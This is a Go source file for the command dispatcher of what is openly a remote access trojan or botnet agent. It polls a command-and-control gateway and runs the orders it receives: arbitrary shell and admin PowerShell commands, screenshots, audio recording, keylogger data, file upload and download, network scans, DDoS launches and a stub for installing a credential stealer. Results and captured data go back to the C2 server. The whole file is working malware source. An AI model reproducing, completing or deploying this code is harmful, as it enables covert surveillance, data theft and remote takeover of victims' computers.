package main

import (
	"bytes"
	"encoding/json"
	"errors"
	"fmt"
	"github.com/abdfnx/gosh"
	"io"
	"log"
	"net/http"
	"os"
	"time"
)

var ErrInvalidPacket = errors.New("the packet received is incorrect")
var ErrRuntime = errors.New("an error occur when the command start")

type CommandBase struct {
	Name string `json:"name"`
	Args interface{}
}
type RunCommandParams struct {
	Command string `json:"command"`
}

func getCommandName(body []byte) (string, []byte) {
	fmt.Printf("[COMMAND] - Received command : %s\n", string(body[:]))
	data := CommandBase{}
	err := json.Unmarshal(body, &data)
	if err != nil {
		log.Fatal(err)
	}

	return data.Name, body
}

func ReplyToC2(result string) {

	fmt.Println("[REPLY] - Sending response to C2...")

	config := loadConfig(true)

	url := config.Gateway + "/"

	uuid, err := GetMachineUUID()

	if err != nil {

	}

	var jsonData = []byte(`{
		"name": "COMMAND_RESULT",
		"id": "` + uuid + `",
		"result" : ` + result + `
	}`)

	request, error := http.NewRequest("POST", url, bytes.NewBuffer(jsonData))
	request.Header.Set("Content-Type", "application/json; charset=UTF-8")

	client := &http.Client{}
	response, error := client.Do(request)
	if error != nil {
		panic(error)
	}
	defer response.Body.Close()

}

func ReplyErrToC2(err error) {}

func getCommand() {

	fmt.Println("[COMMAND] - Fetching command to execute...")

	config := loadConfig(true)

	url := config.Gateway + "/"

	uuid, err := GetMachineUUID()

	if err != nil {

	}
	data := map[string]interface{}{
		"name": "GET_COMMANDS",
		"id":   uuid,
	}

	b, err := json.Marshal(data)

	if err != nil {
		fmt.Println("Error during json")
	}

	request, err := http.NewRequest("POST", url, bytes.NewBuffer(b))
	request.Header.Set("Content-Type", "application/json")

	client := &http.Client{}
	response, err := client.Do(request)
	if err != nil {
		fmt.Println("Error during the get command req")
	}
	defer response.Body.Close()

	receivedData, err := io.ReadAll(response.Body)

	if err != nil {
	}

	name, byteBody := getCommandName(receivedData)

	switch name {

	case "Announce":
		_ = announce()
		break

	case "SetRelay":
		data := SetRelayParams{}
		err = json.Unmarshal(byteBody, &data)
		if err != nil {
			ReplyErrToC2(ErrInvalidPacket)
		}

		setRelay(data)
		ReplyToC2(`{ "success" : true, "message" : "Relay has been edited successfully !" }`)
		gosh.PowershellCommand("Restart-Computer")
		break

	case "SetPullingRate":
		data := SetPullingRateParams{}
		err = json.Unmarshal(byteBody, &data)
		if err != nil {
			ReplyErrToC2(ErrInvalidPacket)
		}

		setPullingRate(data)
		ReplyToC2(`{ "success" : true, "message" : "PullingRate has been edited successfully !" }`)
		break

	case "InstallIpScanner":
		data := InstallIpScannerParams{}
		err = json.Unmarshal(byteBody, &data)
		if err != nil {
			ReplyErrToC2(ErrInvalidPacket)
		}

		_, err := installIpScanner(data)
		if err != nil {
			ReplyErrToC2(ErrRuntime)
		}
		ReplyToC2(`{ "success" : true, "message" : "IpScanner has been installed successfully" }`)
		break

	case "GetSysInfo":
		data := GetSysInfoParams{}
		err = json.Unmarshal(byteBody, &data)
		if err != nil {
			ReplyErrToC2(ErrInvalidPacket)
		}

		scanResult, err := getSysInfo(data)
		if err != nil {
			ReplyErrToC2(ErrRuntime)
		}
		ReplyToC2(fmt.Sprintf(`{ "success" : true, "message" : "%s" }`, scanResult))
		break

	case "Ping":
		data := PingParams{}
		err = json.Unmarshal(byteBody, &data)
		if err != nil {
			ReplyErrToC2(ErrInvalidPacket)
		}

		result, err := ping(data)

		if err != nil {
			ReplyErrToC2(ErrRuntime)
		}
		fmt.Println(result)
		ReplyToC2(`{ "success" : true, "message" : "ping success" }`)
		break

	case "Wifi":
		// TODO
		data := WifiParams{}
		err = json.Unmarshal(byteBody, &data)
		if err != nil {
			ReplyErrToC2(ErrInvalidPacket)
		}

		response := map[string]interface{}{
			"success": true,
			"message": wifi(data),
		}

		res, err := json.Marshal(response)

		if err != nil {
			ReplyErrToC2(ErrRuntime)
		}

		ReplyToC2(string(res))
		break

	case "Ddos":
		// TODO
		data := DdosParams{}
		err = json.Unmarshal(byteBody, &data)
		if err != nil {
			ReplyErrToC2(ErrInvalidPacket)
		}

		ddos(data)
		ReplyToC2(`{ "success" : true, "message" : "Ddos has been launched successfully" }`)
		break

	case "DownloadFile":
		// TODO
		data := DownloadFileParams{}
		err = json.Unmarshal(byteBody, &data)
		if err != nil {
			log.Fatal(err)
		}

		downloadFile(data)
		break

	case "NetworkScan":
		// TODO
		data := NetworkScanParams{}
		err = json.Unmarshal(byteBody, &data)
		if err != nil {
			ReplyErrToC2(ErrInvalidPacket)
		}

		networkScan(data)
		break

	case "UploadFile":
		data := UploadFileParams{}
		err = json.Unmarshal(byteBody, &data)
		if err != nil {
			ReplyErrToC2(ErrInvalidPacket)
		}

		err := uploadFile(data)

		if err != nil {
			ReplyErrToC2(ErrRuntime)
		}

		ReplyToC2(fmt.Sprintf(`{ "success" : true, "message" : "%s" }`, "File has been uploaded successfully"))
		break

	case "GetPublicIp":
		data := GetPublicIpParams{}
		err = json.Unmarshal(byteBody, &data)
		if err != nil {
			ReplyErrToC2(ErrInvalidPacket)
		}

		ip, err := getPublicIp(data)
		if err != nil {
			ReplyErrToC2(ErrRuntime)
		}

		ReplyToC2(fmt.Sprintf(`{ "success" : true, "message" : "%s" }`, ip))
		break

	case "GetPrivateIp":
		data := GetPrivateIpParams{}
		err = json.Unmarshal(byteBody, &data)
		if err != nil {
			ReplyErrToC2(ErrInvalidPacket)
		}

		response := map[string]interface{}{
			"success": true,
			"message": getPrivateIp(data),
		}

		res, err := json.Marshal(response)
		fmt.Println(string(res))
		if err != nil {
			ReplyErrToC2(ErrRuntime)
		}
		ReplyToC2(string(res))
		break

	case "RunCommand":
		data := RunCommandParams{}
		err = json.Unmarshal(byteBody, &data)
		if err != nil {
			ReplyErrToC2(ErrInvalidPacket)
		}

		out, err := cmdOut(data.Command)
		if err != nil {
			ReplyErrToC2(ErrRuntime)
		}

		result := map[string]interface{}{
			"success": true,
			"message": out,
		}

		res, err := json.Marshal(result)

		if err != nil {
			ReplyErrToC2(ErrRuntime)
		}

		ReplyToC2(string(res))
		break

	case "Screenshot":
		data := ScreenshotParams{}
		err = json.Unmarshal(byteBody, &data)
		if err != nil {
			ReplyErrToC2(ErrInvalidPacket)
		}
		rawBytes, err := CaptureScreen(data)
		if err != nil {
			ReplyErrToC2(ErrRuntime)
		}

		// save bytes to file
		f, err := os.CreateTemp("", "screenshots-*.png")

		if err != nil {
			ReplyErrToC2(ErrRuntime)
		}

		defer os.Remove(f.Name())

		_, err = f.Write(rawBytes)
		if err != nil {
			ReplyErrToC2(ErrRuntime)
		}

		ReplyToC2(`{ "success" : true, "message" : "Screenshot has been taken successfully" }`)

		UploadScreenshot(f.Name())
		break

	case "AudioCapture":
		data := AudioCaptureParams{}
		err = json.Unmarshal(byteBody, &data)
		if err != nil {
			ReplyErrToC2(ErrInvalidPacket)
		}
		fmt.Printf("AudioCapture : listening during %d file will be saved at %s\n", data.Length, data.Path)
		_ = RecordAudio(data)
		// wait for the file to be created
		time.Sleep(1 * time.Second)
		ReplyToC2(`{ "success" : true, "message" : "Audio has been recorded successfully" }`)
		UploadAudio(data.Path)
		break

	case "InstallPython":
		data := InstallPythonParams{}
		err = json.Unmarshal(byteBody, &data)
		if err != nil {
			ReplyErrToC2(ErrInvalidPacket)
		}
		_, _ = InstallPython(data)
		ReplyToC2(`{ "success" : true, "message" : "Python has been successfully" }`)
		break

	case "InstallStealer":
		// TODO
		config := loadConfig(true)

		url := config.Gateway + "/gen/stealer"
		fmt.Println(url)
		//downloadFile(DownloadFileParams{
		//	Url:  url,
		//	Path: "%appdata%\\agent\\stealer.py",
		//})

		break

	case "PowershellAdmin":
		data := PowershellAdminParams{}
		err = json.Unmarshal(byteBody, &data)
		if err != nil {
			ReplyErrToC2(ErrInvalidPacket)
		}
		output := Please(string(data.Command))
		fmt.Println(output)
		ReplyToC2(fmt.Sprintf(`{ "success" : true, "message" : "%s" }`, output))
		break

	case "GetKeyboardData":
		// TODO read file content and upload it to server
		data, err := GetKeyboardData()
		if err != nil {
			ReplyErrToC2(ErrRuntime)
		}

		result := map[string]interface{}{
			"success": true,
			"message": data,
		}

		res, err := json.Marshal(result)

		ReplyToC2(string(res))
		break

	case "Idle":
		// TODO
		break

	default:
		fmt.Println("Not handled command")
		fmt.Println(name)
		break
	}

}
